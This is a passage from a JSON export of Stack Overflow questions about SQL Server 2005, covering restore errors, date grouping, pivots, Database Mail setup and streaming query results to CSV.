Restore();\n    BackupDeviceItem deviceItem = new BackupDeviceItem(filePath, DeviceType.File);\n    sqlRestore.Devices.Add(deviceItem);\n    sqlRestore.Database = databaseName;\n    ServerConnection connection = new ServerConnection(serverName, userName, password);\n    Server sqlServer = new Server(connection);\n    Database db = sqlServer.Databases[databaseName];\n    sqlRestore.Action = RestoreActionType.Database;\n    String dataFileLocation = dataFilePath;\n    String logFileLocation = logFilePath; \n    db = sqlServer.Databases[databaseName];\n    sqlRestore.RelocateFiles.Add(new RelocateFile(databaseName, dataFileLocation));\n    sqlRestore.RelocateFiles.Add(new RelocateFile(databaseName + \"_log\", logFileLocation));\n    sqlRestore.ReplaceDatabase = true;\n    sqlRestore.Complete +=new ServerMessageEventHandler(sqlRestore_Complete);\n    sqlRestore.SqlRestore(sqlServer);\n    db = sqlServer.Databases[databaseName];\n    db.SetOnline();\n    sqlServer.Refresh();\n}\n</code></pre>\n\n<p>On calling this method the restore operation failed with this message</p>\n\n<blockquote>\n  <p>Restore failed for Server\n  'MDM04\\SQLEXPRESS'.</p>\n</blockquote>\n\n<p>mdm04 is my computer name</p>\n\n<p>the inner exception is</p>\n\n<blockquote>\n  <p>\"System.Data.SqlClient.SqlError:\n  Logical file 'vrv' is not part of\n  database 'vrv'. Use RESTORE\n  FILELISTONLY to list the logical file\n  names.\"</p>\n</blockquote>\n\n<p>vrv is database name</p>\n\n<p>What should I do to restore the file</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":309,"score":-2,"question_id":10652716,"title":"Group days by week","body":"<p>Is there is a way to group dates by week of month in SQL Server?</p>\n\n<p>For example </p>\n\n<pre><code>Week 2: 05/07/2012 - 05/13/2012\nWeek 3: 05/14/2012 - 05/20/2012\n</code></pre>\n\n<p>but with Sql server statement</p>\n\n<p>I tried</p>\n\n<pre><code>SELECT SOMETHING, \n     datediff(wk, convert(varchar(6), getdate(), 112) + '01', getdate()) + 1 AS TIME_\nFROM STATISTICS_\nGROUP BY something, TIME_\nORDER BY TIME_\n</code></pre>\n\n<p>but it returns the week number of month. (means 3)</p>\n\n<p>How to get the pair of days for current week ?</p>\n\n<p>For example, now we are in third (3rd) week and <strong>I want to show</strong> <code>05/14/2012 - 05/20/2012</code></p>\n\n<p>I solved <strong><em>somehow</em></strong>:</p>\n\n<pre><code>SELECT DATEADD(ww, DATEDIFF(ww,0,&lt;my_column_name&gt;), 0)\n\nselect DATEADD(ww, DATEDIFF(ww,0,&lt;my_column_name&gt;), 0)+6\n</code></pre>\n\n<p>Then I will get two days and I will concatenate them later.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":10652051,"title":"Trouble with SQL decimals","body":"<p>I have run a SQL query in SQL Server Management Studio 2005 and when my results come through my <code>Total_Cost</code> column is not formatted as I want.</p>\n\n<p>I have tried adding in a <code>Declare @TOTAL_COST decimal(12,2)</code> clause but cannot seem to get this to work so have taken it out again.</p>\n\n<p>My query is:-</p>\n\n<pre><code>SELECT     \n   vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATID AS COST_CAT_CODE, \n   vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATNME AS COST_CAT_NAME, \n   vwREP_GP_ContractProjectPurchaseRpt.COST, \n   vwREP_GP_ContractProjectPurchaseRpt.ITEMDESC AS ITEM, \n   vwREP_GP_ContractProjectPurchaseRpt.CREDITOR, \n   vwREP_GP_ContractProjectPurchaseRpt.DOC_NUM AS DOCUMENT_NUMBER, \n   vwREP_GP_ContractProjectPurchaseRpt.DESCRIPTION, \n   vwREP_GP_ContractProjectPurchaseRpt.DOC_DATE AS DATE,  \n   vwREP_GP_ContractProjectPurchaseRpt.PROJECT AS JOB_CODE_STAGE, \n   vwREP_GP_ContractProjectPurchaseRpt.COMPOUNDNAME AS CATEGORY_DESCRIPTION\nFROM         \n   vwREP_GP_ContractProjectPurchaseCostCatID \nINNER JOIN\n   vwREP_GP_ContractProjectPurchaseRpt ON vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATID = vwREP_GP_ContractProjectPurchaseRpt.PACOSTCATID\n\nSELECT  \n   CATEGORY_DESCRIPTION, SUM(COST) AS TOTAL_COST \nFROM    \n   (SELECT \n        COMPOUNDNAME AS CATEGORY_DESCRIPTION, COST \n    FROM   \n        vwREP_GP_ContractProjectPurchaseRpt \n   ) A\nGROUP BY \n    CATEGORY_DESCRIPTION \n</code></pre>\n\n<p>This gives me the results I am looking for but the <code>Total_Cost</code> produces numbers in a 5 decimal format.  </p>\n\n<p>For example:</p>\n\n<pre><code>156713.55000\n</code></pre>\n\n<p>What is the best way to get the result to read something along the lines of - </p>\n\n<pre><code>156713.55\n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["tsql","sql-server-2005","sql-agent-job"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":153,"score":3,"question_id":10648475,"title":"Need to start agent job and wait until completes and get success or failure","body":"<p>I have been trying to find sample code with using SQL Server 2005, I need to start an Agent Job and wait until it finishes process and then get the success or failure.  </p>\n\n<p>I know that I can use </p>\n\n<pre><code>EXEC MSDB.dbo.sp_start_job @Job_Name = 'JobName' \n</code></pre>\n\n<p>to start the job but I can't find any sample code to poll the <code>msdb.dbo.sp_help_job</code> to know when it is completed and then find out if it was successful or failed.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":10651268,"title":"SQL Group By clause (invalid column)?","body":"<p>i am building some basic sql query and have come unstuck on a 'group By' clause.  I have used alias on my column headers but have hit problems when trying to 'group By' my results.  My code at the moment is:-</p>\n\n<pre><code>SELECT                 \n  vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATID AS COST_CAT_CODE, \n  vwREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATNME AS COST_CAT_NAME, \n  vwREP_GP_ContractProjectPurchaseRpt.COST, \n  vwREP_GP_ContractProjectPurchaseRpt.ITEMDESC AS ITEM, \n  vwREP_GP_ContractProjectPurchaseRpt.CREDITOR, \n  vwREP_GP_ContractProjectPurchaseRpt.DOC_NUM AS DOCUMENT_NUMBER, \n  vwREP_GP_ContractProjectPurchaseRpt.DESCRIPTION, \n  vwREP_GP_ContractProjectPurchaseRpt.DOC_DATE AS DATE,  \n  vwREP_GP_ContractProjectPurchaseRpt.PROJECT AS JOB_CODE_STAGE, \n  vwREP_GP_ContractProjectPurchaseRpt.COMPOUNDNAME AS CATEGORY_DESCRIPTION\nFROM         \n  vwREP_GP_ContractProjectPurchaseCostCatID \nINNER JOIN\n  vwREP_GP_ContractProjectPurchaseRpt ON  wREP_GP_ContractProjectPurchaseCostCatID.PACOSTCATID = vwREP_GP_ContractProjectPurchaseRpt.PACOSTCATID\n\n\nSELECT CATEGORY_DESCRIPTION, SUM(COST) AS TotalCost FROM \n    ( \n        SELECT COMPOUNDNAME AS CATEGORY_DESCRIPTION FROM wREP_GP_ContractProjectPurchaseRpt\n    ) A \nGROUP BY CATEGORY_DESCRIPTION\n</code></pre>\n\n<p>Having added in extra code to deal with using alias column names I now get an error that 'COST' is an invalid column?  I have not changed this column name??</p>\n\n<p>I know its something obvious staring at me but my brain is not engaging so if anyone can point out where I am going wrong or a simplier way of doing this that would be a great help.</p>\n\n<p>Thanks in advance.</p>\n\n<p>(this is all being done on sql server management studio 2005)</p>\n"},{"tags":["sql-server-2005","greatest-n-per-group"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":102,"score":-1,"question_id":10645125,"title":"selecting the nth highest marks","body":"<p>I've a table:</p>\n\n<pre><code>create table marks(stdName nvarchar(30), marks float)\ninsert into marks\nselect 'std1', 98\nunion all select 'std2', 96\nunion all select 'std3', 95\nunion all select 'std4', 97\nunion all select 'std5', 93\n</code></pre>\n\n<p>I want to create stored procedure to select the row with <strong>nth highest marks</strong> as given input parameter.suppose if the input parameter is 3, it should display 'std2', 96 or if\ninput parameter is 5, it should display 'std5', 93. </p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":10650445,"title":"Inserting the value into a table","body":"<p>I am trying to run this query in SQL Server 2005. When I run this statement I am getting the result the 1 row inserted but the problem is <code>DateOut</code> and <code>TimeOut</code> column values are not inserting..</p>\n\n<pre><code>insert into timecardtest(DateIn, TimeIn, DateOut, TimeOut, companyid, subcompanyid, EID, \n                         Surname, MiddleName, FirstName, Shift, Department,\n                         RegularHours, LunchHours, OverTime1, OverTime2, DueTime, Breaks,\n                         TotalHours, Status, Late, Early, Holiday, Absent, Vacation, Sick,\n                         Personel, PaidLeave, UnPaidLeave, HalfPaidLeave, OtherLeave,\n                         HolidayWorkHrs, NumOfRecordsInLog, machineid, overWriteflag,\n                         LeaveDesc, productId, WeeklyOff, latehours, ManHour) \nvalues \n('2012-05-11','1/1/1900 06:54:00 AM','2012-05-11','1/1/1900 06:49:00 PM', \n3, 3,'10378', 'H', 'R', 'RAJA KUMAR BOROVH', 7, 7,715,0,0,0,0 ,0 ,\n715,1,0,1,0, 0, 0, 0 , 0, 0, 0 , 0, 0, 0, 0,  '0',1, 'Present' , 3 ,0,0,0)\n</code></pre>\n\n<p>Please Help me to solve the issue</p>\n\n<p>Regards,\nShashikala A</p>\n"},{"tags":["c#","sql","sql-server-2005","view","count"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":188,"score":4,"question_id":10618879,"title":"SQL how to sum events in one hour between two dates and show it in one row","body":"<p>I am developing a report with C# and SQL server 2005,\nI have to only show how many hit we got in each hour. the table is very huge.\noutput should look like this:</p>\n\n<pre>\nRow# |     Date    |  Time  | Hit Count\n-----------------------------\n1    | 07/05/2012  |  8:00  |  3\n2    | 07/05/2012  |  9:00  |  4\n3    | 07/05/2012  |  10:00 |  0\n4    | 07/05/2012  |  11:00 |  5\n</pre>\n\n<p>My table is look like this:</p>\n\n<pre>\n\"HitTime\":\n\n07/05/2012 08:02:24\n07/05/2012 08:12:21\n07/05/2012 08:23:00\n07/05/2012 09:01:00\n07/05/2012 09:08:14\n07/05/2012 09:12:31\n07/05/2012 09:22:27\n</pre>\n\n<p>..etc\nAs you see in HitTime field I only have date and time, I need to show at same date, from for example 8:00 till 8:59 how many hit did I get, and it should be for all day, from very first second that day starts till very end second of the day.</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":10636429,"title":"Update a column in a table","body":"<p>I need to update a column in a table which is of int data type but the values from other table i used for updating is nvarchar.\nwheather this is achieved if so please let me know.</p>\n"},{"tags":["sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":10648441,"title":"SQL Server trigger to other SQL Server (both 2005)","body":"<p>Is it possible to trigger to another SQL Server? </p>\n\n<p>Say data is inserted into <code>[server1].[database].[tablename]</code>, I want it to also insert into <code>[server2].[database].[tablename]</code>. Is that possible?</p>\n\n<p>How do I set it up like that? I especially need to know about granting user permissions.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":10648295,"title":"SQL Server - using default values","body":"<p>In my table there are default values set for 3 columns. I am using stored procedure on that table for creation modification and deletion. </p>\n\n<p>At creation time a new row will be created with all default values set, but when I modify that row, my 3 column's default values changed as null.</p>\n\n<p>How it will happened if any one know how to resolve it plz revert me as early as possible</p>\n"},{"tags":["sql-server-2005","ado.net","c++-cli","connection-string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":10646420,"title":"SQL client connectionstring error","body":"<p>I'm new to SQLClient, working in VS2008 and attempting to connect to an SQL server 2005 SQL Express instance on my local machine.</p>\n\n<p>I've been trying different combinations of quote marks, capital letters, and other things, and I can't seem to get the connection.</p>\n\n<p>My code is </p>\n\n<pre><code>using namespace System::Data::SqlClient ;\n...\nString^ connectionString = \"Server=MY-PC\\SQLEXPRESS; Database=myDB; Trusted_Connection=True; \" ;\nSqlConnection^ connection = gcnew SqlConnection(connectionString) ;\nconnection-&gt;Open() ;\n</code></pre>\n\n<p>where MY-PC is the machine name.</p>\n\n<p>The error is \"The server was not found or was not accessible. \"</p>\n\n<p>Is there something obviously wrong?</p>\n\n<p>Thanks,\nMelanie</p>\n"},{"tags":["sql","sql-server","sql-server-2005","optimization"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":120,"score":0,"question_id":10598679,"title":"Directly evaluate subquery in SQL Server","body":"<p>I have a SQL query that's fairly complicated and involves multiple subqueries and unions. Despite the complexity, the subquery part executes very quickly (&lt; 1ms once compiled). But when I run the query as a whole, it's taking upwards of 60ms.</p>\n\n<p>I've used \"set statistics time on\" and \"set statistics io on\" to track accesses of the base tables, and SQL is performing many more logical reads than necessary. When I run the subquery on it's own, it only does 10 reads or so, but it's around 1800 when the entire query is run.</p>\n\n<p>I'd like to encourage SQL to evalute the subquery first - the expected number of rows is 1-5 so the data set is tiny. It should then be inner joined to the same base table, and pull back an estimated 10-20 records.</p>\n\n<p>Is there a way to use hints to ensure SQL optimises for the expected cases? The query logic seems to be too much for the optimiser and it's choosing an execution plan that would only be ideal for row sets far larger than will ever exist in my situation.</p>\n\n<p>Edit: One of the conditions in the final join will filter out 99.99% of the rows in the base table. If I can force SQL to evaluate that first, it should do the trick. Is there a way to do this?</p>\n\n<p>Query text here: <a href=\"http://pastebin.com/zVR91AP2\" rel=\"nofollow\">http://pastebin.com/zVR91AP2</a></p>\n\n<p>With the WHERE clause at the end commented out, the query returns 4 rows and runs in &lt;1ms with 33 logical reads of the audit table. \nBut if I uncomment the WHERE clause, it returns 3 rows (1 filtered out) and takes 50ms with a whopping 1277 logical reads of the audit table. The io stats indicate that a work table is being used in the first instance, but not in the second. I want to encourage SQL to use this work table.</p>\n"},{"tags":["sql","database","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":10643184,"title":"How to set mutliple variables using SELECT and CASE","body":"<p>I am trying to set variables in my stored procedure when the passed parameter is a certain value like this:</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[Procedure1]\n(\n    @ID int,\n    @WatchType varchar(100)\n)\nAS\n    SET NOCOUNT ON\n    DECLARE @stock int\n    DECLARE @price float\n    DECLARE @details varchar(max)\n\nCASE @WatchType\nWHEN 'TIMEX' THEN\n    (SELECT @stock= Stock, \n    @price= Price, \n    @details= Details, \n    FROM tblWatches WHERE Uid= @ID)\nELSE\nEND\n</code></pre>\n\n<p>I keep getting an error when I try to parse it. Does anyone know why?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","dynamic-sql"],"answer_count":3,"favorite_count":5,"up_vote_count":4,"down_vote_count":0,"view_count":13003,"score":4,"question_id":2554826,"title":"Dynamic SQL to generate column names?","body":"<p>I have a query where I'm trying pivot row values into column names and currently I'm using <code>SUM(Case...) As 'ColumnName'</code> statements, like so:</p>\n\n<pre><code>SELECT\nSKU1,\nSUM(Case When Sku2=157 Then Quantity Else 0 End) As '157',\nSUM(Case When Sku2=158 Then Quantity Else 0 End) As '158',\nSUM(Case When Sku2=167 Then Quantity Else 0 End) As '167'\nFROM\nOrderDetailDeliveryReview\nGroup By\nOrderShipToID,\nDeliveryDate,\nSKU1 \n</code></pre>\n\n<p>The above query works great and gives me exactly what I need.  However, I'm writing out the <code>SUM(Case...</code> statements by hand based on the results of the following query:</p>\n\n<pre><code>Select Distinct Sku2 From OrderDetailDeliveryReview \n</code></pre>\n\n<p>Is there a way, using T-SQL inside a stored procedure, that I can dynamically generate the <code>SUM(Case...</code> statements from the <code>Select Distinct Sku2 From OrderDetailDeliveryReview</code> query and then execute the resulting SQL code?</p>\n"},{"tags":["sql-server","hibernate","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":10641016,"title":"Hiberante and SQL Server Column name","body":"<p>I have a database that uses \"-\" in it's columns names.</p>\n\n<p>Example</p>\n\n<pre><code>system-test-id\n</code></pre>\n\n<p>I mapped the table in Hibernate, but when I try to select all, for example, I get this error:</p>\n\n<pre><code>Invalid column name \"system\"\n</code></pre>\n\n<p>Notice that only the first word is taken as column name. </p>\n\n<p>Option show_sql in hibernate shows me this:</p>\n\n<pre><code>select this_.system-test-id as system1_0_0_ (...)\n</code></pre>\n\n<p><strong>EDIT</strong></p>\n\n<p>I had to add \\\" in the column name on mapping:</p>\n\n<pre><code>@Id\n@Column(name=\"\\\"system-test-id\\\"\")\nprivate long systemTestId;\n</code></pre>\n"},{"tags":["sql","sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":148,"score":1,"question_id":10640214,"title":"Connecting to Data Sources in the Script Task","body":"<p>I'm having some trouble using the connection manager from a script task in SSIS. The program will compile perfectly until I try using the connection that is set in the Environment. </p>\n\n<pre><code>Private Sub InsertLog(ByRef log() As String)\n        Dim conn As SqlClient.SqlConnection\n        conn = _\n            DirectCast(Dts.Connections(\"ConfigDB\").AcquireConnection(Dts.Transaction),  _\n            SqlClient.SqlConnection)\n        MsgBox(log(0) &amp; \"  \" &amp; log(1) &amp; \"  \" &amp; log(2) &amp; \"  \" &amp; log(3) &amp; Dts.Connections(\"ConfigDB\").ConnectionString.ToString())\nEnd Sub\n</code></pre>\n\n<p>If I comment out the Dim and DirectCast the package executes successfully and I can successfully get the connection string in a messagebox.</p>\n\n<pre><code>Data Source=PathToServer;Initial Catalog=DB;Provider=...;Integrated Security=...;Application Name=...;Auto Translate=False;\n</code></pre>\n\n<p>Has anyone else had this happen?</p>\n"},{"tags":["sql","sql-server","database","sql-server-2005","sql-server-2008"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":7071,"score":1,"question_id":1046993,"title":"What are the major differences between Sql Server 2005 and Sql Server 2008?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/198478/advantages-of-sql-server-2008-over-sql-server-2005\">Advantages of SQL Server 2008 over SQL Server 2005?</a>  </p>\n</blockquote>\n\n\n\n<p>What are the major differences between Sql Server 2005 and Sql Server 2008?</p>\n\n<p>How could I convince my organization to invest in Sql Server 2008?</p>\n\n<p>For me, one major aspect that I see is that they have a good framework to programmatically generate SSIS packages with the use of ezAPI.</p>\n\n<p>I want to know your reasons.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":7,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":10624099,"title":"Deleting data from a huge table","body":"<p>I have few tables and all of them have approx: 5 million rows and each table has Active column in it. i want to delete the data from all the tables where Active = 0.using delete takes lot of time and also I cannot truncate the table since it has Foreign key constraints and Identity field.</p>\n\n<p>Is there an efficient way to do this?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":10626275,"title":"Sending Fax SQL Server","body":"<p>I m try to send a fax through SQl server 2008.</p>\n\n<pre><code>EXECUTE master.sys.xp_sendmail \n@recipients='[FAX:XXXXXXX]', \n@message=' &lt;Message details&gt;, @subject=&lt;subject&gt; ' \nEXECUTE master..xp_stopmail\n</code></pre>\n\n<p>Unfortunately it giving me the error as below</p>\n\n<pre><code>Msg 17938, Level 16, State 0, Line 0\nSQL Mail does not work with the 64-bit version of SQL Server\nMsg 17938, Level 16, State 0, Line 0\nSQL Mail does not work with the 64-bit version of SQL Server\n</code></pre>\n\n<p>I get google what can be the possible turnaround, but there nothing related to SQL Server 2008.</p>\n\n<p>Any inputs would be appreciated.</p>\n\n<p>Thanks !!!</p>\n"},{"tags":["sql-server","tsql","sql-server-2005","pivot"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":10610466,"title":"Pivot and filter","body":"<p>I am trying to create a dynamic Pivot, however cant seem to get it working. </p>\n\n<p>Table:</p>\n\n<pre><code>SELECT [CaseID], [ClientID]\nfrom [RegData]\n</code></pre>\n\n<p>Currently Returns:</p>\n\n<pre><code>CaseID--|ClientID| RecID\n------------------------\n7845107 |115172  |410\n7845107 |164570  |1197\n7845107 |115655  |416\n7845107 |154244  |425\n7856846 |116684  |151\n7856846 |112354  |445\n7455444 |115172  |492\n7455444 |164570  |518\n7455444 |115655  |1297\n7455444 |154244  |681\n</code></pre>\n\n<p>I need it to return like:</p>\n\n<pre><code>CaseID--|Val1----|Val2----|Val3----|Val4----|\n7845107 |115172  |164570  |115655  |154244  |\n7856846 |116684  |112354  |        |        |\n7455444 |115172  |164570  |115655  |154244  |\n</code></pre>\n\n<p>Then, I need to find the instances where CaseID is different, but VAL1, VAL2, VAL3 etc are the same.</p>\n\n<pre><code>CaseID--|Val1----|Val2----|Val3----|Val4----|\n7845107 |115172  |164570  |115655  |154244  |\n7455444 |115172  |164570  |115655  |154244  |\n</code></pre>\n\n<p>Thanks in advanced for your help...</p>\n\n<p>-R</p>\n"},{"tags":["java","sql-server-2005","csv"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":10349341,"title":"Memory spike trying to load lots of objects and streaming down to a csv","body":"<p>We have a web application where users can download a list of data by clicking a link. What that does is fires a stored proc in a MS sql server db - fetches rows with 14 columns and all Strings. Once we get that and extract from the resultset we directly stream it down to a csv file on teh client's machine. That way we are saving creating intermediate domain objects(equal to number of rows retuned) in memory before starting the streaming operation. Also we donot wait until the whole resultset has been loaded in memory.\nHowever say for clients who has e..g 80000 instances of such data - it is still spiking up the memory by 50 mb - then there is a fall of around 20 mb and it remains at that level for quite sometime. If I do a Perform GC on jconsole it frees the remaining 30 mb as well. Not sure what is causing that to linger for sometime. Also the 50 mb spike is unnacceptable for a application running on 1.2 gig memory. for bigger clients it shots up by 400 mb and freezes the application or OOM happens.\nAny suggestion how we can achieve this? \nPLEASE note - I have implemented teh same thing in another place and there is downloads a file of same size but different data(6 columns) in 5 secs and with a memory spike of only 5 mb. In this case it took the stored proc to run in only 4 secs though when run on Sql Mnagament studio. But the one for which i am getting a huge spike the query itself takes 45 secs to run and more based on data as it passes it through a lot of validation. Can that have an adverse effect? I was hoping not as we are fetching chunks of 1000 on the setFetchSize() on the preparedststement</p>\n\n<p>here is the snippet of code</p>\n\n<pre><code>Connection connection = null;\n        PreparedStatement statement = null;\n        ResultSet rs = null;\n        OutputStream outputStream = null;\n        BufferedWriter bufferedWriter = null;\n        try\n        {\n            response.setContentType(\"application/save\");\n            response.setHeader(\"Content-Disposition\", \"attachment; filename=\"\n                    + link.getFileName());\n\n            outputStream = response.getOutputStream();\n\n            bufferedWriter = new BufferedWriter(new OutputStreamWriter(\n                    outputStream));\n\n            connection = dataSource.getConnection();\n            statement = connection.prepareStatement(link.getQuery());\n\n            statement.setFetchSize(1000);\n            statement.setInt(1, form.getSelectedClientId());\n\n            rs = statement.executeQuery();\n\n            while (rs.next())\n            {\n\n                bufferedWriter\n                        .write(getCsvRowString(new String[]\n                        { rs.getString(1), rs.getString(2), rs.getString(3),\n                                rs.getString(4), rs.getString(5),\n                                rs.getString(6), rs.getString(7),\n                                rs.getString(8), rs.getString(9),\n                                rs.getString(10), rs.getString(11),\n                                rs.getString(12), rs.getString(13),\n                                rs.getString(14), rs.getString(15),\n                                rs.getString(16), rs.getString(17),\n                                rs.getString(18) }));\n\n            }\n\n        } catch (final Exception e)\n        {\n            log.error(\"Error in downloading extracts \" + e.getMessage());\n            throw e;\n        } finally\n        {\n            if (bufferedWriter != null)\n            {\n                bufferedWriter.flush();\n                bufferedWriter.close();\n            }\n            if (outputStream != null)\n            {\n                outputStream.close();\n            }\n\n            rs.close();\n            statement.close();\n            connection.close();\n        }\n</code></pre>\n"},{"tags":["sql-server-2005","c#-2.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":10634120,"title":"TransactionScope rollback","body":"<p>I have a program to process in two Databases.So, I use TransactionScope. \nI make exception while process is in Database two. But updated rows are not rollbacked in Database one.\nWhat's wrong with my code, somebody point me. Codes that I use is as following. </p>\n\n<pre><code>private void Process()\n{\n    try\n    {\n        using (TransactionScope l_TS = new TransactionScope())\n        {\n            using(connectionone)\n            {\n                connectionone.Open();\n                UpdateTable(\"tableone\",connectionone);\n                UpdateTable(\"tabletwo\",connectionone);\n            }\n            using(connectiontwo)\n            {\n                connectiontwo.Open();\n                UpdateTable(\"tablethree\",connectiontwo);\n                UpdateTable(\"tablefour\",connectiontwo);\n            }\n            l_TS.Complete();\n        }\n    }\n    catch(Exception ex)\n    {\n        throw ex;\n    }\n}\n\nPrivate void UpdateTable(string atblname, SqlConnection conn)\n{\n    //do updating;\n}\n</code></pre>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1274,"score":0,"question_id":7492490,"title":"Converting columns into rows in T-SQL (SQL 2005)","body":"<p>Trying to figure out how to do a query to give me the results in a desired way:</p>\n\n<p>Table Cars:</p>\n\n<pre><code>car_id  Make    Model   Color\n1   Ford    Focus   Red\n2   Ford    Fiesta  Silver\n3   Honda   Accord  Silver\n</code></pre>\n\n<p>Select from cars where car_id = 1</p>\n\n<pre><code>Car_id  1\nMake    Ford\nModel   Focus\nColor   Red\n</code></pre>\n\n<p>So pretty much taking a column and converting it into a row. Using SQL 2005 (which I am new tat using) as a database.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","c#-4.0","service-broker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":156,"score":0,"question_id":10624277,"title":"Service Broker in Database/Programming","body":"<p><strong><a href=\"http://msdn.microsoft.com/en-us/library/ms345108%28v=sql.90%29.aspx\" rel=\"nofollow\">Service Broker</a></strong></p>\n\n<ol>\n<li>What can be the Benefits of Programming with Service Broker?</li>\n<li>In which condition one should use Service Broker?</li>\n<li>Do you have Sample link for Code/Video that easily/precisely explains it's usage? </li>\n</ol>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008","ssms"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":123,"score":1,"question_id":589944,"title":"Sql Server Object Organisation","body":"<p>OK I'm not sure if this is valid, however I have a bug bear with SQL Server, and that is that I cannot organise objects in to a group of objects.</p>\n\n<p>Imagine I'm working on a new section of work in a large database and I perhaps have 15 objects that I will be regularly using. What I want to do is sort of \"Favourite\" them in to a folder so that I don't have to trawl through all objects in my databases.</p>\n\n<p>I know I could organise objects by schema, however these objects aren't necessarily schema specific, they cross boundaries.</p>\n\n<p>Has anyone come across a method for organising objects in to a favourites group? I know SQL Server Projects organise scripts, but I can't see that they can organises tables?</p>\n\n<p>Thanks</p>\n\n<p>Ed</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":562,"score":0,"question_id":10626926,"title":"Sending Email through SQL Server FAILED","body":"<p>I am setting up Database mail in SQL Server 2008 to send mail to my Gmail account. Following are the details of the DBMail profile I've created:</p>\n\n<pre><code>email id : xyz@gmail.com\nDisplay Name : xyz\nReply email :\nServer name : smtp.gmail.com\nport no: 587\nCheck : This server requires a secure connection\nCheck : Basic Authentication\nusername : xyz@gmail.com ( should have gmail.com)\npassword : &lt;mypassword&gt;\nconfirm password : &lt;mypassword&gt;\n</code></pre>\n\n<p>Then I clicked next and also made it default public profile.</p>\n\n<p>Then I use the following TSQL code to configure and send DBMail:</p>\n\n<pre><code>EXEC sp_CONFIGURE 'show advanced', 1\nGO\nRECONFIGURE\nGO\nEXEC sp_CONFIGURE 'Database Mail XPs', 1\nGO\nRECONFIGURE\nGO\n\nuse msdb\ngo\nEXEC sp_send_dbmail \n@profile_name='XYZ',\n@recipients='XYZr@gmail.com',\n@subject='Test message',\n@body='Message Sent Successfully'\n\nThe output appears \"Message Queued\"\n</code></pre>\n\n<p>Still my message is getting failed. I feel I have setup the server correctly. Any input would be appreciated.</p>\n\n<pre><code> SELECT * FROM sysmail_log\n</code></pre>\n\n<p>The body column shows</p>\n\n<blockquote>\n  <p>\"The mail could not be sent to the recipients because of the mail server failure. (Sending Mail using Account 1 (2012-05-16T17:05:00). Exception Message: Could not connect to mail server. (No such host is known). )\"</p>\n</blockquote>\n"},{"tags":["sql-server-2005","ado","recordset"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":323,"score":0,"question_id":10523045,"title":"Particular query causes ADO Recordset to fail with E_FAIL","body":"<p>i'm trying to run (two) queries against SQL Server 2005 using ADO:</p>\n\n<pre><code>SELECT\n   sp.nt_username AS NTUsername,\n   sp.hostname AS HostName\nFROM sys.dm_tran_locks tl\n   INNER JOIN master.dbo.sysprocesses sp\n   ON tl.request_session_id = sp.spid\nWHERE tl.resource_type = N'APPLICATION'\nAND tl.resource_database_id = (\n       SELECT dbid\n       FROM master.dbo.sysprocesses\n       WHERE spid = @@spid)\n</code></pre>\n\n<p>and the SQL Server 2000 compatible 